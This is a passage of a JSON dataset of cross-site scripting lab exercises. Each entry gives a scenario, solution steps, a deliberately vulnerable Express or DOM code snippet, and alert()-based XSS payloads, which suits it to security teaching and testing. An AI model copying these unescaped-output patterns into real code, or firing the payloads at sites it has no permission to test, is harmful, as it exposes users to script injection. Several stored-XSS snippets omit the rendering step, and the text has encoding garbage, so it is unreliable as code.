    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-review', (req, res) => { const content = req.body.content; db.query(\"INSERT INTO reviews (text) VALUES (?)\", [content]); res.redirect('/books'); });",
    "payloads": [
      "<script>alert('Book')</script>",
      "<img src=x onerror=alert('ReviewXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in poll results summary",
    "Lab Description": "The app displays submitted poll answers in the URL response. The input is reflected into the DOM without sanitization. To solve: Inject a payload into the answer parameter.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Go to /poll-summary?answer=<svg onload=alert('Poll')>",
      "Observe execution in the summary page.",
      "Confirm location of injection.",
      "Try onmouseover-based payloads.",
      "Validate through DevTools."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/poll-summary', (req, res) => { const answer = req.query.answer; res.send(`<div>${answer}</div>`); });",
    "payloads": [
      "<svg onload=alert('Poll')>",
      "<script>alert('PollResult')</script>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in CRM user greeting",
    "Lab Description": "The CRM dashboard personalizes greetings using location.hash. It writes the name using innerHTML. To solve: Inject a malicious fragment to execute JavaScript.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Visit /crm.html#<img src=x onerror=alert('CRM')>",
      "Reload page and observe greeting behavior.",
      "Check DOM for unsafe HTML insertion.",
      "Try different fragment-based payloads.",
      "Ensure no backend validation."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "document.getElementById('welcome').innerHTML = location.hash.substring(1);",
    "payloads": [
      "<img src=x onerror=alert('CRM')>",
      "<svg/onload=alert('HashXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in newsletter platform welcome message",
    "Lab Description": "Newsletter creators can write custom welcome messages. These are rendered to subscribers without sanitization. To solve: Inject XSS payload in the welcome text.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a newsletter with welcome: <script>alert('Newsletter')</script>",
      "Subscribe with a test account.",
      "Observe welcome page behavior.",
      "Test innerHTML updates and DOM injection.",
      "Confirm that new users see the payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/create-welcome', (req, res) => { const message = req.body.message; db.query(\"INSERT INTO welcomes (text) VALUES (?)\", [message]); res.redirect('/newsletter'); });",
    "payloads": [
      "<script>alert('Newsletter')</script>",
      "<img src=x onerror=alert('WelcomeXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in booking confirmation page",
    "Lab Description": "Booking details are reflected in the confirmation page using URL parameters. The input is not encoded properly. To solve: Inject JavaScript via the 'name' parameter.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit /booking?name=<script>alert('Booking')</script>",
      "Check how name is rendered in confirmation.",
      "Observe payload execution.",
      "Try SVG/onerror-based payloads.",
      "Verify across browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/booking', (req, res) => { const name = req.query.name; res.send(`<h1>Booking confirmed for ${name}</h1>`); });",
    "payloads": [
      "<script>alert('Booking')</script>",
      "<img src=x onerror=alert('ConfirmXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in code snippet sharing site",
    "Lab Description": "Users can publish code snippets that get rendered on a shared page. There's no escaping of user input, allowing stored XSS. To solve: Submit a snippet with a payload.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a snippet: <script>alert('Snippet')</script>",
      "Access the shared view page.",
      "Observe payload execution.",
      "Use DevTools to confirm raw HTML rendering.",
      "Test encoded and obfuscated forms."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-snippet', (req, res) => { const code = req.body.code; db.query(\"INSERT INTO snippets (content) VALUES (?)\", [code]); res.redirect('/snippets'); });",
    "payloads": [
      "<script>alert('Snippet')</script>",
      "<svg onload=alert('ShareXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in event manager speaker bio",
    "Lab Description": "Organizers can add speaker bios, which are shown on the event page without escaping HTML. To solve: Inject a script in the bio field and trigger it from the speaker page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login as organizer and submit speaker bio with <script>alert('BioXSS')</script>.",
      "Open the event page.",
      "Observe script execution.",
      "Confirm persistence and cross-user visibility.",
      "Try obfuscated payloads."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/add-speaker', (req, res) => { const bio = req.body.bio; db.query(\"INSERT INTO speakers (bio) VALUES (?)\", [bio]); res.redirect('/speakers'); });",
    "payloads": [
      "<script>alert('BioXSS')</script>",
      "<img src=x onerror=alert('Speaker')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in e-commerce gift message preview",
    "Lab Description": "The app lets users preview gift messages, but reflects user input without sanitization. To solve: Inject a script in the message parameter and observe execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Access /preview-message?msg=<script>alert('Gift')</script>",
      "Observe execution in preview.",
      "Check DOM location of injection.",
      "Try SVG/onload-based payloads.",
      "Validate across devices."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/preview-message', (req, res) => { const msg = req.query.msg; res.send(`<p>Gift Message: ${msg}</p>`); });",
    "payloads": [
      "<script>alert('Gift')</script>",
      "<svg onload=alert('GiftXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in personal finance tracker notes",
    "Lab Description": "Users can add notes to transactions. These are rendered without escaping. To solve: Inject a script in the note field and confirm execution when viewing history.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add note with <script>alert('Finance')</script> to a transaction.",
      "Open transaction history.",
      "Observe script execution.",
      "Test onerror and SVG payloads.",
      "Confirm persistence."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/add-note', (req, res) => { const note = req.body.note; db.query(\"INSERT INTO notes (content) VALUES (?)\", [note]); res.redirect('/history'); });",
    "payloads": [
      "<script>alert('Finance')</script>",
      "<img src=x onerror=alert('Money')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in quiz platform result page",
    "Lab Description": "The quiz result page reads the user's score from location.hash and renders it using innerHTML. To solve: Inject a script via hash and reload the page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Visit /result.html#<img src=x onerror=alert('Score')>",
      "Confirm execution in result area.",
      "Inspect DOM to locate injection point.",
      "Try onmouseover-based payloads.",
      "Confirm across browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "document.getElementById('score').innerHTML = decodeURIComponent(location.hash.slice(1));",
    "payloads": [
      "<img src=x onerror=alert('Score')>",
      "<svg onload=alert('QuizXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in food delivery special instructions",
    "Lab Description": "Special instructions for food orders are rendered on the order view without escaping. To solve: Inject a script in the instructions field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Place order with instructions: <script>alert('Food')</script>",
      "Open order summary page.",
      "Observe script execution.",
      "Try DOM-based variations.",
      "Check persistence across sessions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/place-order', (req, res) => { const instructions = req.body.instructions; db.query(\"INSERT INTO orders (instructions) VALUES (?)\", [instructions]); res.redirect('/orders'); });",
    "payloads": [
      "<script>alert('Food')</script>",
      "<img src=x onerror=alert('DeliveryXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in meeting room booking system",
    "Lab Description": "The app reflects the 'room' parameter into a confirmation page without escaping. To solve: Inject a script in the room field and observe the confirmation.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Access /confirm?room=<script>alert('Room')</script>",
      "Observe script execution.",
      "Try encoded versions of payload.",
      "Confirm injection context in HTML.",
      "Test against browser filters."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/confirm', (req, res) => { const room = req.query.room; res.send(`<div>Room Booked: ${room}</div>`); });",
    "payloads": [
      "<script>alert('Room')</script>",
      "<img src=x onerror=alert('BookXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in car rental pickup instructions",
    "Lab Description": "Rental customers can provide pickup instructions. These are rendered to the dispatcher without escaping. To solve: Inject a persistent XSS payload.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Enter pickup instructions with <script>alert('Car')</script>.",
      "Access dispatcher dashboard.",
      "Observe payload execution.",
      "Confirm HTML location and raw rendering.",
      "Ensure it persists across sessions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-instructions', (req, res) => { const instructions = req.body.instructions; db.query(\"INSERT INTO pickups (details) VALUES (?)\", [instructions]); res.redirect('/rentals'); });",
    "payloads": [
      "<script>alert('Car')</script>",
      "<img src=x onerror=alert('PickupXSS')>"
    ]
  },
  {
    "Lab scenario": "DOM XSS in fitness app workout summary",
    "Lab Description": "The summary page takes a value from location.search and inserts it with innerHTML. To solve: Inject XSS via the URL parameter.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Access /summary.html?goal=<svg onload=alert('Fitness')>",
      "Observe execution on summary page.",
      "Check placement in DOM.",
      "Confirm raw HTML injection.",
      "Test alternative vectors."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const urlParams = new URLSearchParams(location.search); document.getElementById('goal').innerHTML = urlParams.get('goal');",
    "payloads": [
      "<svg onload=alert('Fitness')>",
      "<img src=x onerror=alert('Workout')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in recruitment application resume comment",
    "Lab Description": "Recruiters can leave comments on resumes. These comments are rendered on the admin view without sanitization. To solve: Inject a script as a recruiter comment.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add comment <script>alert('Resume')</script> on a CV.",
      "Open it as an admin.",
      "Check HTML structure in DOM.",
      "Confirm persistent execution.",
      "Try encoded/obfuscated payloads."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/add-comment', (req, res) => { const comment = req.body.comment; db.query(\"INSERT INTO comments (text) VALUES (?)\", [comment]); res.redirect('/applications'); });",
    "payloads": [
      "<script>alert('Resume')</script>",
      "<svg onload=alert('CommentXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in file upload confirmation",
    "Lab Description": "After a user uploads a file, the filename is reflected into the page without encoding. To solve: Inject XSS into the filename and observe reflection.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Upload file named <script>alert('Upload')</script>.txt",
      "Confirm the filename is reflected raw in HTML.",
      "Observe XSS payload execution.",
      "Check encoding behavior in HTML.",
      "Confirm cross-browser consistency."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/upload-success', (req, res) => { const name = req.query.filename; res.send(`<p>File uploaded: ${name}</p>`); });",
    "payloads": [
      "<script>alert('Upload')</script>",
      "<img src=x onerror=alert('Filename')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in travel booking special requests",
    "Lab Description": "The travel booking form allows users to leave special requests that are displayed to the airline staff without sanitization. To solve: Inject a persistent script that executes when the staff views the request.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a booking with special request: <script>alert('Travel')</script>",
      "Login as airline staff and view the booking.",
      "Observe payload execution.",
      "Try image-based payloads for evasion.",
      "Confirm execution across sessions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-request', (req, res) => { const request = req.body.special; db.query(\"INSERT INTO requests (note) VALUES (?)\", [request]); res.redirect('/bookings'); });",
    "payloads": [
      "<script>alert('Travel')</script>",
      "<img src=x onerror=alert('Flight')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in discount coupon input",
    "Lab Description": "The discount code is reflected back to the user without sanitization when it's invalid. To solve: Inject a script via the coupon field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Enter <script>alert('Coupon')</script> as coupon code.",
      "Submit the form and observe the reflection.",
      "Check rendering context in HTML.",
      "Try alternate encoded payloads.",
      "Confirm execution without login."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/apply-coupon', (req, res) => { const code = req.body.code; res.send(`<p>Invalid code: ${code}</p>`); });",
    "payloads": [
      "<script>alert('Coupon')</script>",
      "<svg/onload=alert('Discount')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online education class feedback",
    "Lab Description": "Students can leave feedback after a session. The text is rendered directly on the instructor dashboard. To solve: Inject persistent XSS in feedback text.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback: <script>alert('Edu')</script> after session.",
      "Instructor logs in and opens feedback.",
      "Observe script execution.",
      "Try variations with iframe or SVG.",
      "Confirm persistence and cross-user impact."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-class-feedback', (req, res) => { const feedback = req.body.text; db.query(\"INSERT INTO class_feedback (content) VALUES (?)\", [feedback]); res.redirect('/thankyou'); });",
    "payloads": [
      "<script>alert('Edu')</script>",
      "<iframe srcdoc='<script>alert(123)</script>'></iframe>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online poll title parameter",
    "Lab Description": "The poll preview page reflects a poll title parameter from the URL. The input is not encoded before rendering, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit /preview-poll?title=<script>alert('Poll')</script>",
      "Observe reflected input in DOM.",
      "Confirm HTML context and script execution.",
      "Try encoding tricks.",
      "Verify across browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/preview-poll', (req, res) => { const title = req.query.title; res.send(`<h1>${title}</h1>`); });",
    "payloads": [
      "<script>alert('Poll')</script>",
      "<img src=x onerror=alert('Vote')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in hotel booking contact field",
    "Lab Description": "Users enter contact info during hotel booking. The email/phone is displayed to staff without escaping. To solve: Inject a persistent script in the contact field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Enter <script>alert('Hotel')</script> as contact.",
      "Login as hotel admin and view booking.",
      "Observe XSS execution.",
      "Test across browsers.",
      "Try payloads with malformed tags."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/book-hotel', (req, res) => { const contact = req.body.contact; db.query(\"INSERT INTO hotel_bookings (contact) VALUES (?)\", [contact]); res.redirect('/confirmation'); });",
    "payloads": [
      "<script>alert('Hotel')</script>",
      "<img src=1 onerror=alert('Stay')>"
    ]
  },
  {
    "Lab scenario": "DOM XSS in shopping cart item preview",
    "Lab Description": "The cart item preview reads item name from location.hash and inserts it with innerHTML. To solve: Inject a malicious hash and reload the preview page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Visit /cart-preview.html#<img src=x onerror=alert('Cart')>",
      "Observe script execution in item name area.",
      "Check DOM placement.",
      "Try SVG/onload alternatives.",
      "Confirm trigger without user interaction."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "document.getElementById('item').innerHTML = decodeURIComponent(location.hash.slice(1));",
    "payloads": [
      "<img src=x onerror=alert('Cart')>",
      "<svg onload=alert('Preview')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in messaging app display name",
    "Lab Description": "Users can update display names. These are rendered to other users in chat without escaping. To solve: Inject a script in the name field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Change display name to <script>alert('Chat')</script>.",
      "Send a message.",
      "Recipient opens chat, triggering XSS.",
      "Check if XSS executes on hover or load.",
      "Test multiple payload variations."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/update-name', (req, res) => { const name = req.body.name; db.query(\"UPDATE users SET display_name = ? WHERE id = ?\", [name, req.user.id]); res.redirect('/chat'); });",
    "payloads": [
      "<script>alert('Chat')</script>",
      "<img src=x onerror=alert('NameXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in password reset redirect URL",
    "Lab Description": "The password reset confirmation page accepts a redirect parameter in the query string. The parameter is reflected without encoding.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit /reset-complete?redirect=<script>alert('Redirect')</script>",
      "Observe script in rendered confirmation.",
      "Check raw HTML in browser tools.",
      "Try payloads with event-based triggers.",
      "Confirm cross-browser consistency."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/reset-complete', (req, res) => { const redirect = req.query.redirect; res.send(`<p>You will be redirected to: ${redirect}</p>`); });",
    "payloads": [
      "<script>alert('Redirect')</script>",
      "<img src=x onerror=alert('Reset')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in music app playlist description",
    "Lab Description": "Users can describe their playlists. These descriptions are rendered on public pages without escaping. To solve: Inject a persistent XSS in the description.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add <script>alert('Playlist')</script> in description.",
      "Publish the playlist.",
      "Access public page and observe XSS.",
      "Try obfuscated payloads.",
      "Confirm persistence and visibility."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/create-playlist', (req, res) => { const desc = req.body.description; db.query(\"INSERT INTO playlists (description) VALUES (?)\", [desc]); res.redirect('/my-playlists'); });",
    "payloads": [
      "<script>alert('Playlist')</script>",
      "<img src=x onerror=alert('Music')>"
    ]
  },
  {
    "Lab scenario": "DOM XSS in language learning app greeting banner",
    "Lab Description": "The app renders a greeting based on the language from the hash. It's inserted into a banner using innerHTML, leading to DOM-based XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Visit /welcome.html#<img src=x onerror=alert('Lang')>",
      "Observe XSS in greeting banner.",
      "Try alternate payloads for obfuscation.",
      "Check for HTML context validation.",
      "Confirm cross-session behavior."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "document.getElementById('greeting').innerHTML = decodeURIComponent(location.hash.substring(1));",
    "payloads": [
      "<img src=x onerror=alert('Lang')>",
      "<svg onload=alert('Learn')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in team chat message history",
    "Lab Description": "A collaboration platform stores chat messages submitted via POST requests. Messages are rendered without sanitization in team history view. To solve: Inject a script in a chat message and confirm it executes when history is loaded.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send POST /chat-message with <script>alert('ChatXSS')</script> as message.",
      "Check chat history page for execution.",
      "Use Burp Suite to verify stored HTML.",
      "Log in with another user and confirm script triggers.",
      "Try variations with event-based payloads."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/chat-message', (req, res) => {\n  const message = req.body.message;\n  db.query(\"INSERT INTO messages (text) VALUES (?)\", [message]);\n  res.send('Message sent');\n});",
    "payloads": [
      "<script>alert('ChatXSS')</script>",
      "<img src=x onerror=alert(1)>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in newsletter signup thank-you page",
    "Lab Description": "The newsletter signup form posts an email and name, which is echoed on the thank-you page. The name field is reflected without escaping. To solve: Inject an XSS payload via name field and trigger execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "POST /subscribe with name=<script>alert('XSS')</script>",
      "Observe thank-you message rendering user input.",
      "Try SVG/onerror variants for stealthy execution.",
      "Use OWASP ZAP to test reflection context.",
      "Validate bypass through encoded payloads."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/subscribe', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Thanks for subscribing, ${name}!</p>`);\n});",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<svg/onload=alert(1)>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in user-generated announcements",
    "Lab Description": "A notice board feature allows users to post announcements. Input is stored in the DB and rendered directly on the homepage. To solve: Inject a script into the announcement text and reload the homepage.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST /new-announcement with <img src=x onerror=alert('XSS')>.",
      "Check homepage for announcement rendering.",
      "Validate storage with Burp Repeater.",
      "Test persistent execution across sessions.",
      "Try nested script or iframe payloads."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/new-announcement', (req, res) => {\n  const text = req.body.text;\n  db.query(\"INSERT INTO announcements (text) VALUES (?)\", [text]);\n  res.send('Announcement posted');\n});",
    "payloads": [
      "<img src=x onerror=alert('XSS')>",
      "<script>alert('Notice')</script>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in dynamic event response form",
    "Lab Description": "A RSVP form posts attendee names, then echoes the name back in the success message. The response is vulnerable to reflected XSS. To solve: Inject a script in the name field and trigger upon form submission.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "POST /rsvp with name=<svg/onload=alert('RSVP')>",
      "Check response for script execution.",
      "Try different payload encodings.",
      "Confirm execution across browsers.",
      "Check behavior with longer inputs."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/rsvp', (req, res) => {\n  const name = req.body.name;\n  res.send(`<div>Thank you, ${name}, for your RSVP.</div>`);\n});",
    "payloads": [
      "<svg/onload=alert('RSVP')>",
      "<script>alert('XSS')</script>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in photo gallery description",
    "Lab Description": "Users can upload images with descriptions. The description field is displayed on the public gallery without escaping. To solve: Inject a script via the description and verify its execution on view.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST /upload-photo with description=<script>alert('XSS')</script>",
      "Reload gallery and confirm script execution.",
      "Try variants using image error events.",
      "Use Burp to confirm DB storage.",
      "Test if payload is persistent across logins."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/upload-photo', (req, res) => {\n  const desc = req.body.description;\n  db.query(\"INSERT INTO gallery (description) VALUES (?)\", [desc]);\n  res.send('Photo uploaded');\n});",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=1 onerror=alert('Gallery')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in classroom Q&A forum",
    "Lab Description": "Students can ask questions via a POST form. The application renders questions without sanitizing HTML. To solve: Inject a script in the question text and confirm execution on the teacher\u00e2\u20ac\u2122s view.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST /ask-question with <script>alert('XSS')</script> as question.",
      "Access /forum and verify script runs.",
      "Check persistence using session switching.",
      "Use <iframe> or <img> payload variants.",
      "Confirm rendering in teacher\u00e2\u20ac\u2122s session."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/ask-question', (req, res) => {\n  const q = req.body.question;\n  db.query(\"INSERT INTO questions (text) VALUES (?)\", [q]);\n  res.redirect('/forum');\n});",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<iframe srcdoc='<script>alert(1)</script>'></iframe>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in customer feedback handler",
    "Lab Description": "A feedback form accepts POSTed comments and reflects them back in a confirmation box. Without sanitization, attackers can inject scripts. To solve: Inject an XSS payload via comment field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "POST /send-feedback with comment=<img src=x onerror=alert('XSS')>",
      "Observe confirmation rendering unsanitized content.",
      "Try other event-based payloads.",
      "Confirm behavior with ZAP active scan.",
      "Test encoded injection variants."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/send-feedback', (req, res) => {\n  const comment = req.body.comment;\n  res.send(`<p>Your feedback: ${comment}</p>`);\n});",
    "payloads": [
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('Feedback')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in developer bug report field",
    "Lab Description": "A bug tracker accepts POSTed descriptions of issues. The application fails to sanitize HTML before rendering, leading to stored XSS. To solve: Inject a payload into the bug description.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST /report-bug with description=<script>alert('Bug')</script>",
      "Access /bugs to view the report list.",
      "Observe script execution upon load.",
      "Check if payload affects other users.",
      "Verify storage using sqlmap or Burp."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/report-bug', (req, res) => {\n  const desc = req.body.description;\n  db.query(\"INSERT INTO bugs (desc) VALUES (?)\", [desc]);\n  res.send('Bug reported');\n});",
    "payloads": [
      "<script>alert('Bug')</script>",
      "<img src=invalid onerror=alert('BugXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online recipe contribution field",
    "Lab Description": "Users can submit new recipes using a POST form. The recipe description is displayed without sanitization on the homepage. To solve: Inject JavaScript in the description and confirm execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST /submit-recipe with description=<svg onload=alert('XSS')>",
      "View recipe listing page to trigger XSS.",
      "Use Repeater to test alternate injections.",
      "Try <script>, <img>, and <iframe> variants.",
      "Confirm execution across sessions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-recipe', (req, res) => {\n  const recipe = req.body.description;\n  db.query(\"INSERT INTO recipes (text) VALUES (?)\", [recipe]);\n  res.send('Recipe submitted');\n});",
    "payloads": [
      "<svg onload=alert('XSS')>",
      "<script>alert('Recipe')</script>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in error reporting module",
    "Lab Description": "The application shows raw error messages from form submissions. When invalid data is submitted, the error is reflected without escaping. To solve: Inject a payload in a required field to trigger the XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "POST /error-demo with name=<script>alert('XSS')</script>",
      "Observe validation error rendering your input.",
      "Try breaking tag context for deeper access.",
      "Confirm rendering in <p> tags or other containers.",
      "Use onerror or onmouseover payloads as alternatives."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/error-demo', (req, res) => {\n  const name = req.body.name;\n  if (!name) {\n    res.send(`<p>Error: Name field is empty - ${name}</p>`);\n  } else {\n    res.send('Submitted');\n  }\n});",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=1 onerror=alert('Error')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in fitness app workout notes",
    "Lab Description": "Users can submit workout notes via POST, which are shown on their profile without sanitization. To solve: Inject a persistent script in the notes field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST /add-note with note=<script>alert('FitXSS')</script>",
      "Visit /profile to confirm script executes.",
      "Use Burp Suite to check stored payload.",
      "Try encoded versions for filter evasion.",
      "Test with different user sessions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO notes (text) VALUES (?)\", [note]);\n  res.send('Note saved');\n});",
    "payloads": [
      "<script>alert('FitXSS')</script>",
      "<img src=x onerror=alert('Workout')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in travel booking confirmation page",
    "Lab Description": "A travel booking form reflects the user\u00e2\u20ac\u2122s name in the confirmation message. Input is not sanitized. To solve: Inject a script in the name field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "POST /book with name=<svg onload=alert('XSS')>",
      "Observe reflection on confirmation page.",
      "Try <img> tag variations.",
      "Use ZAP to verify injection context.",
      "Test HTML entity-encoded payloads."
    ],
